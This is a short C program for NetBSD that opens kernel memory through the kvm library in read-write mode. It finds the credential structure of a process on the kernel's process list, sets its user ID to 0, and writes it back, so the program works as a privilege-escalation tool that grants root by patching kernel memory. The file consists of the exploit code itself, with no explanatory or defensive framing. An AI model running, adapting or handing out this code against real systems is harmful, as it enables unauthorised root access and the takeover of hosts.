#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <limits.h>
#include <fcntl.h>
#include <db.h>
#include <sys/param.h>
#include <sys/sysctl.h>
#include <sys/proc.h>
#include <kvm.h>

#include "kvm_private.h"

extern char * kvm_set_kmem_path(char *);

char *drum=0, *kmem=0, *mem=0;

/* BEGIN */

int offset(char *a, char *b)
{
	return(b-a);
}

#define KREAD(kd, addr, obj) \
	(kvm_read(kd, addr, (void *)(obj), sizeof(*obj)) != sizeof(*obj))

int main(int argc, char **argv)
{
	kvm_t *kd;
	char errbuf[_POSIX2_LINE_MAX];
	int i, nentries, o;
	struct kinfo_proc *kp;
	struct proc *p;
	struct proc proc;
	struct eproc eproc;

	struct nlist nl[]={
		#define X_NPROCS 0
		{"_nprocs"},
		#define X_ALLPROC 1
		{"_allproc"},
		{NULL}
	};

	if(argc<4) {
		return(1);
	}

	mem=argv[1];
	kmem=argv[2];
	drum=argv[3];

	kvm_set_kmem_path(kmem);

	kd=NULL;

	kd=kvm_openfiles("/netbsd", mem, drum, O_RDWR, errbuf);

	if(kd==NULL) {
		perror("kvm_openfile");
		printf("%s\n", errbuf);
		return(1);
	}

	i=kvm_nlist(kd, nl);

	if(i<0) {
		perror("kvm_nlist");
		return(1);
	}

	if(KREAD(kd, nl[X_ALLPROC].n_value, &p)) {
		printf("Couldn't read allproc\n");
		return(1);
	}

	if(KREAD(kd, (u_long)p, &proc)) {
		printf("Can't read proc %p\n", p);
		return(1);
	}
	if (KREAD(kd, (u_long)proc.p_cred, &eproc.e_pcred) == 0)
		if (KREAD(kd, (u_long)eproc.e_pcred.pc_ucred, &eproc.e_ucred)) {
			printf("Can't get creditials.  :(\n");
			return(1);
		}

	o=offset((char *)&eproc.e_ucred,(char *)&eproc.e_ucred.cr_uid);

	/* UID to become */
	eproc.e_ucred.cr_uid=0;

	/* printf("Need to write to %p\n", eproc.e_pcred.pc_ucred+o); */

	if(kvm_write(kd, (u_long)eproc.e_pcred.pc_ucred+o,
		&eproc.e_ucred.cr_uid, 4) != 4) {
		printf("kvm_write failed\n");
		return(1);
	}

	return(0);
}
